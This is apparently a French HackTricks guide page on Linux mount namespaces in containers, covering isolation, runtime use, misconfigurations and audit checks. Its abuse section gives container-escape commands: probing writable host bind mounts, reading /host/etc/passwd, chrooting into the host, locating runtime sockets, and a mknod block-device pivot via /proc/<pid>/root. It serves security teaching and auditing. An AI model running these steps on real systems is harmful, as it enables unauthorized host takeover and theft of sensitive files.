# Espace de noms de montage

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

L'espace de noms de montage contrôle la **table de montage** qu'un processus voit. C'est l'une des fonctionnalités d'isolation des containers les plus importantes, car le système de fichiers racine, les bind mounts, les tmpfs mounts, la vue procfs, l'exposition sysfs et de nombreux montages d'aide spécifiques au runtime sont tous exprimés via cette table de montage. Deux processus peuvent tous deux accéder à `/`, `/proc`, `/sys` ou `/tmp`, mais ce à quoi ces chemins correspondent dépend de l'espace de noms de montage dans lequel ils se trouvent.

Du point de vue de la sécurité des containers, l'espace de noms de montage fait souvent la différence entre « il s'agit d'un système de fichiers d'application soigneusement préparé » et « ce processus peut voir ou influencer directement le système de fichiers de l'hôte ». C'est pourquoi les bind mounts, les volumes `hostPath`, les opérations de montage privilégiées et les expositions en écriture de `/proc` ou `/sys` tournent toutes autour de cet espace de noms.

## Fonctionnement

Lorsqu'un runtime lance un container, il crée généralement un nouvel espace de noms de montage, prépare un système de fichiers racine pour le container, monte procfs et d'autres systèmes de fichiers d'assistance selon les besoins, puis ajoute éventuellement des bind mounts, des tmpfs mounts, des secrets, des config maps ou des host paths. Une fois que ce processus s'exécute à l'intérieur de l'espace de noms, l'ensemble des montages qu'il voit est en grande partie découplé de la vue par défaut de l'hôte. L'hôte peut toujours voir le système de fichiers sous-jacent réel, mais le container voit la version assemblée pour lui par le runtime.

## Laboratoire

Vous pouvez créer un espace de noms de montage privé avec :
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Si vous ouvrez un autre shell en dehors de cet espace de noms et inspectez la table de montage, vous verrez que le montage tmpfs n'existe qu'à l'intérieur de l'espace de noms de montage isolé. C'est un exercice utile car il montre que l'isolation des montages n'est pas une théorie abstraite ; le noyau présente littéralement une table de montage différente au processus.
Si vous ouvrez un autre shell en dehors de cet espace de noms et inspectez la table de montage, le montage tmpfs n'existera qu'à l'intérieur de l'espace de noms de montage isolé.

À l'intérieur des conteneurs, une comparaison rapide est :
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Le deuxième exemple montre à quel point une configuration d'exécution peut créer facilement une brèche importante dans la frontière du système de fichiers.

## Utilisation à l'exécution

Docker, Podman, les stacks basées sur containerd et CRI-O reposent tous sur un mount namespace privé pour les conteneurs normaux. Kubernetes s'appuie sur le même mécanisme pour les volumes, projected secrets, config maps, et les montages `hostPath`. Les environnements Incus/LXC s'appuient aussi fortement sur les mount namespaces, notamment parce que les system containers exposent souvent des systèmes de fichiers plus riches et plus semblables à ceux d'une machine que les application containers.

Cela signifie que lorsque vous examinez un problème de système de fichiers d'un conteneur, vous n'êtes généralement pas en train d'observer une bizarrerie isolée de Docker. Vous êtes face à un problème de mount-namespace et de configuration d'exécution exprimé à travers la plateforme qui a lancé la charge de travail.

## Mauvaises configurations

L'erreur la plus évidente et la plus dangereuse est d'exposer le root filesystem de l'hôte ou un autre chemin sensible de l'hôte via un bind mount, par exemple `-v /:/host` ou un `hostPath` inscriptible dans Kubernetes. À ce stade, la question n'est plus "can the container somehow escape?" mais plutôt "how much useful host content is already directly visible and writable?" Un host bind mount inscriptible transforme souvent le reste de l'exploit en une simple affaire de placement de fichiers, chrooting, modification de configuration, ou découverte de sockets runtime.

Un autre problème fréquent est d'exposer le `/proc` ou le `/sys` de l'hôte de manière à contourner la vue plus sûre du conteneur. Ces systèmes de fichiers ne sont pas des montages de données ordinaires ; ce sont des interfaces vers l'état du kernel et des processus. Si la charge de travail atteint directement les versions hôtes, bon nombre des hypothèses derrière le durcissement des conteneurs cessent de s'appliquer correctement.

Les protections en lecture seule comptent aussi. Un root filesystem en lecture seule ne sécurise pas magiquement un conteneur, mais il supprime une grande partie de l'espace de préparation de l'attaquant et rend la persistance, le placement de binaires auxiliaires et la modification de configuration plus difficiles. À l'inverse, un root inscriptible ou un host bind mount inscriptible donne à un attaquant de l'espace pour préparer l'étape suivante.

## Abus

Quand le mount namespace est détourné, les attaquants font couramment une des quatre choses suivantes. Ils **lisent des données de l'hôte** qui auraient dû rester en dehors du conteneur. Ils **modifient la configuration de l'hôte** via des bind mounts inscriptibles. Ils **montent ou remontent des ressources supplémentaires** si les capabilities et seccomp le permettent. Ou ils **accèdent à des sockets puissants et à des répertoires d'état runtime** qui leur permettent de demander à la plateforme de conteneur elle‑même davantage d'accès.

Si le conteneur peut déjà voir le système de fichiers de l'hôte, le reste du modèle de sécurité change immédiatement.

Quand vous suspectez un host bind mount, commencez par confirmer ce qui est disponible et si c'est inscriptible :
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Si le système de fichiers racine de l'hôte est monté en lecture-écriture, l'accès direct à l'hôte est souvent aussi simple que :
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Si l'objectif est un accès privilégié au runtime plutôt que le chrooting direct, énumérez les sockets et l'état du runtime :
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Si `CAP_SYS_ADMIN` est présent, testez également si de nouveaux montages peuvent être créés depuis l'intérieur du conteneur :
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemple complet : Two-Shell `mknod` Pivot

Un chemin d'abus plus spécialisé apparaît lorsque l'utilisateur root du container peut créer des périphériques de bloc, que l'hôte et le container partagent une identité utilisateur de manière utile, et que l'attaquant dispose déjà d'un point d'appui à faibles privilèges sur l'hôte. Dans cette situation, le container peut créer un nœud de périphérique tel que `/dev/sda`, et l'utilisateur hôte à faibles privilèges peut ensuite le lire via `/proc/<pid>/root/` pour le processus container correspondant.

À l'intérieur du container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Depuis l'hôte, en tant que l'utilisateur peu privilégié correspondant après avoir localisé le PID du shell du conteneur :
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La leçon importante n'est pas la recherche exacte de la chaîne CTF. Il s'agit du fait que l'exposition du mount-namespace via `/proc/<pid>/root/` peut permettre à un utilisateur de l'hôte de réutiliser des device nodes créés par le container, même lorsque la cgroup device policy empêchait leur utilisation directe à l'intérieur du container lui-même.

## Vérifications

Ces commandes servent à vous montrer la vue du système de fichiers dans laquelle le processus courant se trouve réellement. L'objectif est de repérer les mounts provenant de l'hôte, les chemins sensibles inscriptibles, et tout ce qui semble plus étendu qu'un root filesystem normal d'une application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ce qui est intéressant ici :

- Les bind mounts depuis l'hôte, en particulier `/`, `/proc`, `/sys`, les répertoires d'état d'exécution (runtime) ou les emplacements de sockets, doivent se remarquer immédiatement.
- Les mounts inattendus en read-write sont généralement plus importants qu'un grand nombre de mounts d'assistance en read-only.
- `mountinfo` est souvent le meilleur endroit pour voir si un chemin provient réellement de l'hôte ou s'il repose sur un overlay.

Ces vérifications établissent **quelles ressources sont visibles dans ce namespace**, **lesquelles proviennent de l'hôte**, et **lesquelles sont modifiables ou sensibles en matière de sécurité**.
